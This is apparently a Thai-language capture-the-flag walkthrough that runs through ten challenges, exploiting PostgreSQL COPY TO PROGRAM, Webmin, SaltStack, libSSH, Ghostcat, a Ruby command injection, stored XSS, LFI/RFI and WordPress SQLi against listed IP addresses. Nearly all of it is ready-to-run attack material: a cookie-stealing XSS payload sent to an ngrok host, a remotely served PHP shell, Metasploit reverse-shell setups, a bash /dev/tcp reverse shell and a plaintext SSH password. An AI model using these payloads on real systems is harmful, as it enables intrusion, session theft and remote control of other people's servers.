✅ TOWER #0 — CVE-2019-9193 — PostgreSQL COPY TO PROGRAM RCE

โจทย์: อ่าน /tmp/flag.txt ผ่าน user postgres

1️⃣ ตรวจสอบ service
nmap -sV -p 5432 136.110.46.225

2️⃣ เข้าฐานข้อมูล (postgres default config)
psql -h 136.110.46.225 -U postgres


ถ้าถาม password → ช่องโหว่นี้ใช้ตอน auth แล้วเข้าได้

3️⃣ Exploit แบบ RCE ด้วย COPY TO PROGRAM

Copy output ไปเขียนไฟล์ชั่วคราว แล้ว cat flag ออกมา

COPY flag FROM PROGRAM 'cat /tmp/flag.txt';
SELECT * FROM flag;


ถ้า table ไม่มี → สร้างก่อน

CREATE TABLE flag(data text);
COPY flag FROM PROGRAM 'cat /tmp/flag.txt';
SELECT * FROM flag;


🎉 ได้ flag

✅ TOWER #1 — Stored XSS → Admin Panel
1️⃣ เปิดหน้า support
http://34.87.33.218/support

2️⃣ ส่ง payload ที่จะ execute ตอน admin มาเปิดดู
<script>document.location='http://your-ngrok.ngrok.io?c='+document.cookie</script>


หรือ ถ้า admin panel แสดงข้อความโดยตรง:

<script>alert('pwned')</script>

3️⃣ ไปหน้า admin ตามโจทย์
http://34.87.33.218/admin


→ จะเห็นข้อมูลที่ admin เก็บมาให้ พร้อม flag

✅ TOWER #2 — LFI / RFI → อ่าน /tmp/flag.txt
1️⃣ สแกน directories
gobuster dir -u http://136.110.1.31 -w /usr/share/wordlists/dirb/common.txt

2️⃣ ถ้าเจอ parameter เช่น ?file=

ลอง:

http://136.110.1.31/?file=../../../../../../tmp/flag.txt


หรือ

http://136.110.1.31/view.php?page=../../../../../../tmp/flag.txt

3️⃣ ถ้า RFI เปิด:

ใช้ HTTP Server

echo '<?php system("cat /tmp/flag.txt"); ?>' > f.php
python3 -m http.server 8000


ยิง RFI:

http://136.110.1.31/?page=http://your-ngrok:8000/f.php


🎉 ได้ flag

✅ TOWER #3 — CVE-2019-15107 Webmin Unauth RCE
1️⃣ ใช้ MSF Module
use exploit/linux/http/webmin_backdoor
set RHOSTS 34.177.93.94
set RPORT 10000
set SSL true
set TARGETURI /
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST <ngrok>
set LPORT <ngrok_port>
run

2️⃣ ได้ shell แล้วอ่าน
cat /tmp/flag_random.txt

✅ TOWER #4 — CVE-2020-11651 SaltStack RCE
1️⃣ ใช้ MSF Module
use exploit/linux/saltstack/saltstack_salt_api_cmd_exec
set RHOSTS 34.87.46.136
set RPORT 4506
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST <ngrok>
set LPORT <ngrok_port>
run

2️⃣ อ่าน flag
cat /tmp/flag_*.txt

✅ TOWER #5 — CVE-2018-10933 libSSH Auth Bypass
1️⃣ ใช้ PoC script
python3 libssh-auth-bypass.py 34.87.63.36 22 "cat /root/flag_xxxxxx.txt"

2️⃣ หรือเปิด shell
python3 libssh-auth-bypass.py 34.87.63.36 22 "/bin/bash"

3️⃣ อ่าน flag
cat /root/flag_*.txt

✅ TOWER #6 — Privilege Escalation (Account Given)
1️⃣ SSH login
ssh noob@34.87.11.201 -p 4200
Password: N00bP@ssw0rd

2️⃣ อัพสิทธิ์ด้วย PE script

ใช้ linpeas หรือ pspy หรือ sudo -l

wget http://your-ngrok/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh


หา:

SUID misconfig

sudo NOPASSWD

cronjobs

writable script

3️⃣ อัพ root แล้วอ่าน
cat /root/flag_*.txt

✅ TOWER #7 — Tomcat Ghostcat — CVE-2020-1938

Port 8009 = AJP → vulnerable

1️⃣ ใช้ Ghostcat exploit
python3 ghostcat.py -p 8009 -f WEB-INF/web.xml 34.87.102.147


ถ้า RCE:

python3 ghostcat-rce.py -p 8009 --cmd "cat /root/flag.txt" 34.87.102.147


หรือ MSF

use exploit/multi/http/tomcat_ajp_traversal
set RHOSTS 34.87.102.147
set RPORT 8009
run

✅ TOWER #8 — CVE-2017-17405 Ruby Command Injection
1️⃣ คุณยิงถูกแล้ว (ตาม log ที่ให้)
curl "http://34.126.90.141:8080/download?uri=ftp://your-ngrok/&file=shell.pHp"

2️⃣ shell ที่ใช้
bash -i >& /dev/tcp/your-ngrok/4444 0>&1

3️⃣ อ่าน flag
cat /usr/src/flag*

✅ TOWER #9 — Wordpress vuln plugin → DB dump
1️⃣ สแกน plugin
wpscan --url http://35.240.142.53 --enumerate vp


หา plugin ที่มี SQLi เช่น:

wp-ufaq

wp-polls

newsletter

contact-form-7

gdpr

2️⃣ ถ้า SQLi module MSF:
use auxiliary/scanner/http/wp_plugin_sqli
set RHOSTS 35.240.142.53
run


หรือยิง SQLi โดยตรง

?id=1 UNION SELECT 1,2,flag FROM wp_flags

3️⃣ หา flag ใน DB
wp_flag, wp_options, wp_posts
